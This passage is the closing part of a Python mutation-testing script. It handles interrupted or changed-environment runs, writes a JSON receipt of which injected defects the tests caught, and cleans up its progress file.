              + ". Put back exactly what the run started on (git-ignored files count too) and run it again: what"
              " finished before carries over.")
        return 2
    except EnvironmentChanged as exc:
        print(f"\nthe environment changed during the run (first seen with: {exc}): Python, its packages or Node.js are not"
              " what the run started with. Stopped, and nothing from that defect on was kept; run again to start in the"
              " new environment.")
        return 2
    except RunStopped:
        stop.unlink(missing_ok=True)
        print(f"\nstopped on request; run the same command again to carry on ({progress.name})")
        return 3
    now = tree_files()   # a last look before any receipt, carried-over results included (Codex Pass 3)
    changes = tree_changes(files, now) if tree_digest(files=now) != tree else []
    moved = run_key(tree, environment())["env"] != key["env"]
    if changes or moved:
        print("\nthe repository or the environment is not what the run started with ("
              + "; ".join([*changes[:10], *(["Python, its packages or Node.js changed"] if moved else [])])
              + "): no receipt written. Put them back and run again: what finished carries over (in another"
              " environment a run starts from zero).")
        return 2
    caught = sum(r["result"] == "CAUGHT" for r in results)
    by_result = {k: sum(r["result"] == k for r in results) for k in sorted({r["result"] for r in results})}
    receipt = {"at": _now(), "caught": caught, "total": len(results),
               "by_result": by_result, "baseline": {k: baseline.get(k) for k in ("ran", "skipped", "seconds")},
               "copy_baseline": {**{k: in_copy.get(k) for k in ("ran", "skipped", "seconds")}, "slept": copy_slept},
               "python": sys.version.split()[0], "platform": sys.platform, "workers": args.workers,
               "node": "found" if env["node"] else "NOT FOUND", "node_version": env["node_version"], "packages": env["packages"],
               "tree": tree, "carried_over": len(kept), "reruns_after_sleep": reruns,
               "mutation_timeout_seconds": MUTATION_TIMEOUT, "results": results, "source_sha256": sources}
    (ROOT / "evidence").mkdir(exist_ok=True)
    (ROOT / "evidence" / "mutation-receipt.json").write_text(json.dumps(receipt, indent=1), encoding="utf-8")
    missed = [r for r in results if r["result"] != "CAUGHT"]
    if missed:   # each defect's final result once, after any re-runs (the lines above are per attempt)
        print("\nnot caught:\n" + "\n".join(f"{r['result']:8}  {r['mutation']}" for r in missed))
    print(f"\n{caught}/{len(results)} mutations caught ({', '.join(f'{k} {v}' for k, v in by_result.items())})"
          + (f"; {len(kept)} carried over from a stopped run" if kept else ""))
    if caught != len(results):
        return 1
    try:
        progress.unlink(missing_ok=True)   # finished: nothing left to resume (otherwise the next run picks up here)
    except OSError as exc:
        print(f"could not delete {progress} ({exc}); delete it by hand, or the next run on this tree carries it over")
    return 0


if __name__ == "__main__":
    sys.exit(main())
